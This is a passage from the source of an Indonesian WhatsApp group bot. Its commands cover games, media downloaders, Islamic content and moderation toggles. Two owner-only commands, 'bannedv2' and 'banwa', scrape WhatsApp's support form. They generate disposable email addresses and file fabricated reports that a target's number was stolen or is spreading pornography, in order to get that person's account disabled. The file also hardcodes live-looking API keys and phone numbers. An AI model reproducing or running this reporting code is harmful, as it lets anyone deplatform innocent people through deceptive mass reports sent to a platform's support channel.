ehz.sendMessage(from, { text: jawab, mentions: menst }, { quoted: m })
}
break
case 'caridoi':
    case 'cariteman':{
   if (!isGroup) return onlyGroup()
    let userny = Object.values(db.data.users);
    let teman = pickRandom(userny)
    let namTemen = teman.name
    let nomerTemen = teman.id
    setTimeout(() => {
    setReply('Sedang mencari....')
    }, 1000)
    setTimeout(() => {
    setReply('Berhasil mendapatkan satu org')
    }, 5000)
    setTimeout(() => {
    ehz.sendContAngel(from, nomerTemen, namTemen, m)
    }, 9000)
    }
    break
            case 'afk':{
              if (!m.text.includes('.')) return;
                if (!m.isGroup) return setReply(mess.group)
                if (isAfkOn) return setReply("Kakak Sudah Afk Sebelumnya")
                let reason = q ? q : 'Nothing.'
                afk.addAfkUser(m.sender, Date.now(), reason, _afk)
                let kyah = (`@${m.sender.split('@')[0]} Sedang AFK\nDengan Alasan : ${reason}`)
                
                ehz.sendMessage(from, { 
text: `${kyah}`,
contextInfo:{
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `${botName}`,
"body": 'created by dy_coders',
"containsAutoReply": true,
"mediaType": 1, 
"thumbnailUrl": 'https://telegra.ph/file/8b71af37d07670a5f2228.jpg' ,
}
}
},{ 
quoted: m })
}
break
case 'tagme':{
  if (!isPremium) return setReply('*khusus Premium*')
  if (!m.text.includes('.')) return;
if (!isGroup) return onlyGroup()
let menst = [sender]
ehz.sendMessage(from, { text: `@${senderNumber}`, mentions: menst })
}
break
case 'listgc': {
  if (!m.text.includes('.')) return;
if(!isOwner) return setReply(mess.only.owner)
let getGroups = await ehz.groupFetchAllParticipating()
 //console.log(getGroups)
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
let teks = `*Group chat*\n\nTotal: ${anu.length} Group\n\n`
for (let i of anu) {
let metadata2 = await ehz.groupMetadata(i)
teks += `◉ Nama : ${metadata2.subject}\n◉ Owner : ${metadata2.owner !== undefined ? '@' + metadata2.owner.split`@`[0] : 'Tidak diketahui'}\n◉ ID : ${metadata2.id}\n◉ Dibuat : ${moment(metadata2.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n` 
 }
ehz.sendTextWithMentions(from, teks, m)
}
break
  case 'listpc': {
if(!isOwner) return setReply(mess.only.owner)
let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
let teks = `*Private Chat*\nTotal: ${anulistp.length} Chat\n\n`
for (let i of anulistp) {
let nama = store.messages[i].array[0].pushName
teks += `*Name :* ${pushname}\n*User :* @${sender.split('@')[0]}\n*Chat :* https://wa.me/${sender.split('@')[0]}\n\n───────────\n\n`
}
setReply(teks)
}
break
case 'laporerror':{
let reportzhir = args[0]
if (!reportzhir) return setReply(`Contoh:\n.laporbug menu tidak muncul`)
let duhhh = text.split('|')[0]
let text12 = `「 *Report Bug* 」
*Pesan:* ${duhhh}
*Dari:* @${sender.split('@')[0]}
Ketik *.accerror* Jika Ingin Menerima Laporan
Jika Ingin Menolak Biarin Aja🗿`
setReply(`Oke Kak Reportmu Sudah Terkirim Ke Owner`)
ehz.sendMessage(6281316643491 + "@s.whatsapp.net",{image: { url: `https://telegra.ph/file/df778c74a8f0417235acf.jpg`}, caption: text12, mentionedJid:[sender], quoted: m })
}
break
case 'accerror': {
if (!isOwner && !isAdmins) return setReply()
let zhiratxt = `_Terima Kasih Atas Laporan Anda! Laporan Sudah Diterima oleh kami,Tunggu 1 - 3 Hari Agar Owner Bisa Memperbaikinya_`
let targetNumber = `${q.split(",")[0]}@s.whatsapp.net`;

  ehz.sendMessage(targetNumber, {
    text: `*${zhiratxt}*`,
    mentionesJid: [sender]
  }, {
    quoted: m
  }).then(() => {
    setReply(`Acc berhasil!`);
  }).catch(() => {
    setReply(`Gagal mengirim pesan!`);
  });
}
break

            case 'delete': case 'del': {
              if (!isPremium) return m.reply('*khusus Premium*')
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return setReply('The message was not sent by a bot!')
            ehz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
case 'git': case 'gitclone':
if (!isPremium && global.db.data.users[sender].limit < 5) return onlyLimit()
  if (!m.text.includes('.')) return;
if (!isUrl(args[0]) && !args[0].includes('github.com')) return setReply(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    ehz.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => setReply(mess.error))
    
break
case "bannedv2": {
if (!isOwner) return setReply(mess.only.owner)
if (!args[0]) return setReply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6282196776245`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await ehz.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join(";")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ehz.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
        case 'banwa': {
          

if (!isOwner) return 

if (!text && m.quoted?.text) return setReply(`Where's the number?`)

let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")

let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")

let cookie = ntah.headers["set-cookie"].join("; ")

let $ = cheerio.load(ntah.data)

let $form = $("form");

let url = new URL($form.attr("action"), "https://www.whatsapp.com").href

let form = new URLSearchParams()

form.append("jazoest", $form.find("input[name=jazoest]").val())

form.append("lsd", $form.find("input[name=lsd]").val())

form.append("step", "submit")

form.append("country_selector", "ID")

form.append("phone_number", text)

form.append("email", email.data[0])

form.append("email_confirm", email.data[0])

form.append("platform", "ANDROID")

form.append("your_message", `Hello Dear WhatsApp

Good morning/afternoon/night

My WhatsApp Number ${text} Stolen And Now Used to spread pornography and illegal sales, please take immediate action regarding my account.

If you can, just disable it

for important chat matters I don't have it

Thank you`)

form.append("__user", "0")

form.append("__a", "1")

form.append("__csr", "")

form.append("__req", "8")

form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")

form.append("dpr", "1")

form.append("__ccg", "UNKNOWN")

form.append("__rev", "1006630858")

form.append("__comment_req", "0")

let res = await axios({

  url,

  method: "POST",

  data: form,

  headers: {

    cookie

  }

})

setReply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))

}

break



case 'blockbydy': {
  
    if (!isOwner) return setReply(mess.owner);

    let users = "";

    // Cek apakah ada pengguna yang disebutkan dalam pesan
    if (m.mentionedJid.length > 0) {
        users = m.mentionedJid[0];
    } else if (m.quoted && m.quoted.sender) {
        users = m.quoted.sender;
    } else {
        // Jika tidak ada yang disebutkan, coba ambil dari teks pesan
        users = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    }

    await ehz.updateBlockStatus(users, 'block')
        .then((res) => setReply(jsonformat(res)))
        .catch((err) => m.reply(jsonformat(err)));
}
break

        case 'unblock': {
		if (!isOwner) return setReply(mess.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ehz.updateBlockStatus(users, 'unblock').then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
	}
	break
//============ KE AMANAN ===========/)
case 'antilinkgc':{
    if (!isGroup) return onlyGroup()
    if (!isGroup) return setReply(mess.group)
	if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
	if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
	if (isAntilinkGc) return setReply('Fitur sudah aktif kak')
	db.data.chats[from].antilinkgc = true
	let ih =`Fitur antilink group telah di aktifkan`
	setReply(ih)
	} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
	if (!isAntilinkGc) return setReply('Udah mati')
	db.data.chats[from].antilinkgc = false
	let ih =`Fitur antilink group telah di matikan`
	setReply(ih)
	}else if (!q) {
		setReply ( `*MODE ANTI LINK GRUB*\n ${prefix+command} on/off`)
	 }
	 }
	break;  
   case 'antipromosi': {
if (!isGroup) return onlyGroup()
if (!isGroupAdmins) return setReply(mess.Badmin)
if (args[0] === "on") {
if (db.data.chats[m.chat].promosi2) return setReply(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].promosi2 = true
setReply(`antipromosi Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].promosi2) return setReply(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].promosi2 = false
setReply(`antipromosi Tidak Aktif !`)
} else {
setReply(`Mode ${command}\n\n\nKetik ${prefix + command}on/off`)
}
}
break
 case 'antitoxic':{
if (!isGroup) return onlyGroup()
if (!isGroupAdmins) return setReply(mess.Badmin)
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (isAntiLink) return setReply('Fitur sudah aktif kak')
db.data.chats[from].antitoxic = false
let ih =`Fitur ${command} telah di aktifkan`
setReply(ih)
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!isAntiLink) return setReply(`Fitur ${command} sudah off`)
db.data.chats[from].antitoxic = false
let ih =`Fitur ${command} telah di matikan`
setReply(ih)
} else if (!q) {
setReply(`Mode ${command}\n• .${command} on \n• .${command} off`)
}
}
break
case 'wattpadsearch': {

				if (!q) return setReply(`Example: ${prefix + command} patrick`);


				try {
					const response = await axios.get(`https://rzky.my.id/api/search/wattpad?query=${q}&apikey=HC-tsy5v7WU7K3JWeB`);
					const results = response.data.result.data;

					if (results.length > 0) {
						let caption = '';

						for (const selectedResult of results) {
							caption += `❏ Creator: ${selectedResult.user.name}\n❏ Title: ${selectedResult.title}\n❏ Cover: ${selectedResult.cover}\n❏ Url: ${selectedResult.url}\n\n`;
						}

						ehz.sendMessage(m.chat, {
							image: {
								url: results[0].cover
							},
							caption: caption
						}, {
							quoted: m
						});
					} else {
						setReply('No result information found for the given query.');
					}
				} catch (error) {
					console.error('Error fetching sticker information:', error);
					setReply('Error fetching result information. Please try again later.');
				}
}
				break;
case 'antilink':{
    if (!isGroup) return setReply(mess.group)
	if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
		if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
	if (isAntiLink) return setReply('Fitur sudah aktif kak')
	db.data.chats[from].antilink = true
	let ih =`Fitur antilink telah di aktifkan`
	setReply(ih)
	} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
	if (!isAntiLink) return setReply('Fitur Anti link sudah off')
	db.data.chats[from].antilink = false
	let ih =`Fitur antilink telah di matikan`
	setReply(ih)
	} else if (!q) {
		setReply ( `*MODE ANTI LINK*\n ${prefix+command} on/off`)
	}
	}
	break;          
case 'antivirtex':{
  if (!isGroup) return setReply(mess.group)
	if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
	if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
	 if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
	if (isAntiVirtex) return setReply("Sudah aktif!!");
	db.data.chats[from].antivirtex = true
	setReply("Sukses mengaktifkan antivirtex!");
	} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
	if (!isAntiVirtex) return setReply("Udah off!!");
	db.data.chats[from].antivirtex = false
	setReply("Sukses mematikan antivirtex!");
	} else if (!q) {
	setReply ( `*MODE ANTI VIRTEX*\n ${prefix+command} on/off`)
	 }
	 }
	break;

case 'ig': case 'instagram' :{
  if (!isGroup) return setReply("khusus grup")
  if (!isPremium && global.db.data.users[sender].limit < 4) return setReply(mess.limit)
  if (!m.text.includes('.')) return;
                if (!q) return setReply("Link?")
    sendSticker(stikot)
                let ag = await fetchJson(`https://api.lolhuman.xyz/api/instagram?apikey=4175022d987023a9f0a9f4b4&url=${q}`)
                for (var i = 0; i < ag.result.length; i++) {
                    let pap = ag.result[i].includes('.jpg') ? 'image' : 'video'
                    await ehz.sendMessage(m.chat, {
                        [pap]: {
                            url: ag.result[i]
                            
                        },
                        caption: 'DOWNLOADER INSTAGRAM'
                    }, {
                        quoted: m
                    })
                }
            }
            db.data.users[sender].limit -= 4
            break 
            
			case 'pixiv': {
			  if (!m.text.includes('.')) return;
			    if (!isPremium) return setReply('*khusus Premium*')
			axios.get(`https://api.lolhuman.xyz/api/pixiv?apikey=${api.Lol}&query=${q}`).then(({ data }) => {
				ehz.sendMessage(from, { image: { url: data.result[0].image } })
			})
			}
			break
    //============ ISLAMIC ============//
 case 'kisahnabi':
 if (!isGroup) return onlyGroup()
			if (args.length == 0) return m.reply(`Example: ${prefix + command} Muhammad`)
			m.reply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/kisahnabi/${q}?apikey=${api.Lol}`)
				.then(({ data }) => {
					var nabi = `Name : ${data.result.name}\n`
					nabi += `Lahir : ${data.result.thn_kelahiran}\n`
					nabi += `Umur : ${data.result.age}\n`
					nabi += `Tempat : ${data.result.place}\n`
					nabi += `Story : \n${data.result.story}`
					m.reply(nabi)
				})
				.catch(console.error)
			break
 case 'alquran':
if (!isGroup) return onlyGroup()
			if (args.length < 1) return setReply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
			setReply(mess.wait)
			axios
				.get(`https://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${api.Lol}`)
				.then(({ data }) => {
					var ayat = data.result.ayat
					var text = `QS. ${data.result.surah} : 1-${ayat.length}\n\n`
					for (var x of ayat) {
						text += `${x.arab}\n${x.ayat}. ${x.latin}\n${x.indonesia}\n\n`
					}
					text = text.replace(/<u>/g, '_').replace(/<\/u>/g, '_')
					text = text.replace(/<strong>/g, '*').replace(/<\/strong>/g, '*')
					setReply(text)
				})
				.catch(console.error)
            break
            case 'asmaulhusna':{
if (!isGroup) return onlyGroup()
axios
.get(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${api.Lol}`)
.then(({ data }) => {
var text = `• No : ${data.result.index}\n`
text += `• Latin : ${data.result.latin}\n`
text += `• Arab : ${data.result.ar}\n`
text += `• Indonesia : ${data.result.id}\n`
text += `• English : ${data.result.en}`
setReply(text)
})
.catch((err) => setReply('Server sedang Error coba lag besok!')) 
}
break 
 case 'islamic': 
case 'randomislam': {
if (!isGroup) return onlyGroup()
if (!isPremium && global.db.data.users[sender].limit < 1) return onlyLimit()

setReply(mess.wait)
let g = await fetch(`https://raw.githubusercontent.com/inirey/RESTAPI/master/data/Islamic.json`)
let f = await g.json()
let a = f[Math.floor(Math.random() * f.length)]
//let buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️ ɴᴇxᴛ ᴘʜᴏᴛᴏ`},type:1}]                            
ehz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `dy_net`, mediaType: 3,  renderLargerThumbnail : true,thumbnailUrl: 'https://telegra.ph/file/8b71af37d07670a5f2228.jpg',sourceUrl: `https://wa.me/${nomerOwner}`
}}, image: {url: a}, caption: `${mess.success}` ,footer: `Hasil pencarian dari ${command}`}, { quoted: m })
.catch((err) => setReply('Server sedang error coba lagi besok!'))
db.data.users[sender].limit -= 1
}
break
                case 'stickerwa':
                    if (args.length == 0) return setReply(`Example: ${prefix + command} Koceng Imot`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/stickerwa?apikey=${api.Lol}&query=${query}`)
                    get_result = get_result.result[0].stickers
                    for (var x of get_result) {
                        ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/convert/towebp?apikey=${api.Lol}&img=${x}`)
                        await ehz.sendMessage(from, ini_buffer, sticker)
                    }
                    break
                    case 'gimage2':
                      if (!m.text.includes('.')) return;
                      if (!isPremium) return setReply('*khusus Premium*')
			if (!q) return setReply(`Example: ${prefix + command} cat`)
			axios.get(`https://api.lolhuman.xyz/api/gimage2?apikey=${api.Lol}&query=${q}`).then(({ data }) => {
				for (var x of data.result.slice(0, 3)) {
					ehz.sendMessage(from, { image: { url: x } })
				}
			})
			break
case 'toanime':
case 'jadianime':{
  if (!m.text.includes('.')) return;
  if (!isPremium) return setReply('*khusus Premium*')
if (!isGroup) return onlyGroup()
setReply(mess.wait)
try{
let ahah = await ehz.downloadAndSaveMediaMessage(quoted)
let wewek = await TelegraPh(ahah)
let ini_gen = `${command}`
let get_result = await getBuffer(`https://skizo.tech/api/toanime?url=${wewek}&apikey=${api.dy}`)
ehz.sendMessage(from, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `${botName}`,
body:`Bot aktif ${runtime(process.uptime())}`,
previewType:"PHOTO", 
thumbnail: fs.readFileSync('./media/quoted.jpg'),
sourceUrl:`${sig}`
}}, image: get_result, caption: `*Nih Kak Kamu jadi Anime*`}, { quoted: m })
fs.unlinkSync(ahah) 
}catch(err){
console.log((err) => setReply('Error coba lagi kak'))
}
}
break

        //=========== AREA FUN ============//
 case 'tele':
case 'telestick': {
  if (!isGroup) return setReply("khusus grup")
if (!q) return setReply("stick apa\nConto Miku")
let agg = await fetchJson(`https://api.lolhuman.xyz/api/telestick?apikey=${api.Lol}&url=${q}`)
for (var ki = 0; ki < agg.result.sticker.length; ki++) {
await ehz.sendImageAsSticker(m.sender, agg.result.sticker[ki], m, { packname: "dy_net", author: "By:dy_coders" })
}}
 break
 case 'sc': case 'script':{
   if (!m.text.includes('.')) return;
      ehz.relayMessage(m.chat,  {
    requestPaymentMessage: {
      currencyCodeIso4217: 'Rp',
      amount99999: 1.000,
      requestFrom: m.sender,
      noteMessage: {
      extendedTextMessage: {
      text: `
      SCRIPT : MINTA KE wa.me/6285719898124
`,
      contextInfo: {
      externalAdReply: {
      showAdAttribution: true
      }}}}}}, {})
      }
      break
  case 'joincall':{
    if (!isPremium) return setReply('*khusus Premium*')
    if (!m.text.includes('.')) return;
if (!isGroup) return onlyGroup()
if (!isOwner) return m.reply('khusus owner')
if (!m.text.includes('.')) return;
ehz.relayMessage(m.chat, {
		scheduledCallCreationMessage: {
		callType: "VIDEO",		
		scheduledTimestampMs: 12000,
		title: `call gabut\n\n
═══ dy Multidevice☙\n\n`,		
		inviteCode: 'https://dyproject.my.id',
		}
	}, {})
	}
	break
 case 'kodebahasa':{
	let LANGUAGES = `
	*╭─❲ KODE BAHASA ❳*
	*│*
	*│▸* af: Afrikaans 
	*│▸* sq: Albanian
	*│▸* ar: Arabic
	*│▸* hy: Armenian
	*│▸* ca: Catalan 
	*│▸* zh: Chinese 
	*│▸* zh-cn: Chinese (Mandarin/China)
	*│▸* zh-tw: Chinese (Mandarin/Taiwan)
	*│▸* zh-yue: Chinese (Cantonese)
	*│▸* hr: Croatian
	*│▸* cs: Czech
	*│▸* da: Danish
	*│▸* nl: Dutch
	*│▸* en: English    
	*│▸* en-au: English (Australia)
	*│▸* en-uk: English (United Kingdom)
	*│▸* en-us: English (United States) 
	*│▸* eo: Esperanto 
	*│▸* fi: Finnish 
	*│▸* fr: French
	*│▸* de: German
	*│▸* el: Greek 
	*│▸* ht: Haitian Creole 
	*│▸* hi: Hindi 
	*│▸* hu: Hungarian 
	*│▸* is: Icelandic 
	*│▸* id: Indonesian 
	*│▸* it: Italian
	*│▸* ja: Japanese
	*│▸* ko: Korean
	*│▸* la: Latin
	*│▸* lv: Latvian
	*│▸* mk: Macedonian
	*│▸* no: Norwegian
	*│▸* pl: Polish
	*│▸* pt: Portuguese
	*│▸* pt-br: Portuguese (Brazil)
	*│▸* ro: Romanian
	*│▸* ru: Russian
	*│▸* sr: Serbian
	*│▸* sk: Slovak
	*│▸* es: Spanish 
	*│▸* es-es: Spanish (Spain)
	*│▸* es-us: Spanish (United States)
	*│▸* sw: Swahili
	*│▸* sv: Swedish
	*│▸* ta: Tamil
	*│▸* th: Thai
	*│▸* tr: Turkish
	*│▸* vi: Vietnamese 
	*│▸* cy: Welsh
	*│*
	*╰────────────⦁*`
	setReply(LANGUAGES)
	}
	break
//========= GROUP FEATURE=========//
case 'tebaklirik':{
    
    if (!isPremium && global.db.data.users[sender].glimit < 15) return setReply('Limit game sudah habis, silahkan ketik .limit') // respon ketika limit habis 
if (!isGroup) return setReply(mess.only.group)
	let timeout = 80000
	let poin = 1000
	let id = m.chat
	if (id in ehz.tebaklirik) return setReply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Money
	`.trim()
	ehz.tebaklirik[id] = [
	await setReply(caption),
	json, poin,
	setTimeout(() => {
	if (ehz.tebaklirik[id]) 
user.balance -= 200
m.reply(`*GAME TEBAK LIRIK*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].balance.toLocaleString()}*`)
	delete ehz.tebaklirik[id]
	 }, timeout)
	 ]
	}
    db.data.users[sender].glimit -= 15
	break

case 'siapaaku':{
  if (!isPremium && global.db.data.users[sender].glimit < 15) return setReply('Limit game sudah habis, silahkan ketik .limit') // respon ketika limit habis 
if (!isGroup) return setReply(mess.only.group)
	let timeout = 80000
	let poin = 1000
	let id = m.chat
	if (id in ehz.siapaaku) return setReply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Money
	`.trim()
	ehz.siapaaku[id] = [
	await setReply(caption),
	json, poin,
	setTimeout(() => {
	if (ehz.siapaaku[id]) 
user.balance -= 200
m.reply(`*GAME SIAPAKAH AKU*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].balance.toLocaleString()}*`)
	delete ehz.siapaaku[id]
	 }, timeout)
	 ]
	}
    db.data.users[sender].glimit -= 15
	break
case 'susunkata':{
      if (!isPremium && global.db.data.users[sender].glimit < 15) return setReply('Limit game sudah habis, silahkan ketik .limit') // respon ketika limit habis 
if (!isGroup) return onlyGroup()
	let timeout = 80000
	let poin = 1000
	let id = m.chat
	if (id in ehz.susunkata) return setReply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	Tipe: ${json.tipe}
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Money
	`.trim()
	ehz.susunkata[id] = [
	await setReply(caption),
	json, poin,
	setTimeout(() => {
	user.balance -= 200
m.reply(`*GAME SUSUN KATA*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].balance.toLocaleString()}*`)
	delete ehz.susunkata[id]
	 }, timeout)
	 ]
	}
    db.data.users[sender].glimit -= 15
	break
case 'tekateki':{
  if (!isPremium && global.db.data.users[sender].glimit < 15) return setReply('Limit game sudah habis, silahkan ketik .limit') // respon ketika limit habis 
if (!isGroup) return setReply(mess.only.group)
	let timeout = 80000
	let poin = 1000
	let id = m.chat
	if (id in ehz.tekateki) return setReply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Money 💸
	`.trim()
	ehz.tekateki[id] = [
	await setReply(caption),
	json, poin,
	setTimeout(() => {
	if (ehz.tekateki[id]) 
user.balance -= 200
setReply(`*GAME TEKA-TEKI*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].balance.toLocaleString()}*`)
	delete ehz.tekateki[id]
	 }, timeout)
	 ]
	}
db.data.users[sender].glimit -= 15
	break
case 'math': case 'match': case 'mtk': case 'matematika': {
  if (!isPremium && global.db.data.users[sender].glimit < 15) return onlyGlimit()
		let modes = {
	  noob: [-3, 3, -3, 3, '+-', 10000, 500],
	  easy: [-10, 10, -10, 10, '*/+-', 15000, 600],
	  medium: [-40, 40, -20, 20, '*/+-', 15000, 730],
	  hard: [-100, 100, -70, 70, '*/+-', 20000, 850],
	  extreme: [-999999, 999999, -999999, 999999, '*/', 20000, 1000],
	  impossible: [-99999999999, 99999999999, -99999999999, 999999999999, '*/', 30000, 2500],
	  impossible2: [-999999999999999, 999999999999999, -999, 999, '/', 35000, 3000]
	}
	

	let operators = {
	  '+': '+',
	  '-': '-',
	  '*': '×',
	  '/': '÷'
	}
	
	function genMath(mode) {
	  let [a1, a2, b1, b2, ops, time, bonus] = modes[mode]
	  let a = randomInt(a1, a2)
	  let b = randomInt(b1, b2)
	  let op = pickRandom([...ops])
	  let result = (new Function(`return ${a} ${op.replace('/', '*')} ${b < 0 ? `(${b})` : b}`))()
	  if (op == '/') [a, result] = [result, a]
	  return {
		str: `${a} ${operators[op]} ${b}`,
		mode,
		time,
		bonus,
		result
	  }
	}
	
	function randomInt(from, to) {
	  if (from > to) [from, to] = [to, from]
	  from = Math.floor(from)
	  to = Math.floor(to)
	  return Math.floor((to - from) * Math.random() + from)
	}
	  if (!q) return setReply( `*MATEMATIKA*
   
┌─〔 Mode 〕
├ ${Object.keys(modes).join('\n├ ')}
└────    
	contoh:
	${prefix}math hard
	`)
	  let mode = args[0].toLowerCase()
	  if (!(mode in modes)) return setReply( `
┌─〔 Mode 〕
├ ${Object.keys(modes).join('\n├ ')}
└────    
	contoh:
	${prefix}math hard
	`)
	  let id = from
	  if (id in ehz.math) return setReply('Masih ada soal belum terjawab di chat ini')
	  let math2 = genMath(mode)
	  ehz.math[id] = [
		await setReply(`*MATEMATIKA*\n\nBerapa hasil dari *${math2.str}*?\n\nTimeout: ${(math2.time / 1000).toFixed(2)} detik\nBonus Jawaban Benar: Rp ${math2.bonus} `),
		math2, 4,
		setTimeout(async () => {
			if (ehz.math[id]) await setReply(`Waktu habis!\nJawabannya adalah ${math2.result}\n\n${math2.mode.toUpperCase()}\n\nmath ${math2.mode}`)
	   delete ehz.math[id]
		}, math2.time)
	  ]
	}
	db.data.users[sender].glimit -= 15
	break 	
  
case 'tebakkata':{
if (!isGroup) return onlyGroup()
if (!isPremium && global.db.data.users[sender].glimit < 15) return onlyGlimit()
let poin = 1000
let timeout = 120000
let id = m.chat

if (id in ehz.tebakkata) return setReply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let caption = `*Soal :* ${json.soal}

Timeout *${(timeout / 1000).toFixed(2)} detik*
Exp : +999
Bonus : +${poin} Saldo`.trim()
ehz.tebakkata[id] = [
await setReply(caption),
json, poin,
setTimeout(() => {
if (ehz.tebakkata[id]) 
setReply(`Waktu game telah habis
Jawabannya adalah : ${json.jawaban}`)
delete ehz.tebakkata[id]
 }, timeout)
 ]
}
db.data.users[sender].glimit -= 15
break
 case 'tebakkimia':{
    if (!isPremium && global.db.data.users[sender].glimit < 15) return setReply('Limit game sudah habis, silahkan ketik .limit') // respon ketika limit habis 
if (!isGroup) return onlyGroup()
	let timeout = 30000
	let poin = 1000
	let id = m.chat
	if (id in ehz.tebakkimia) return setReply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
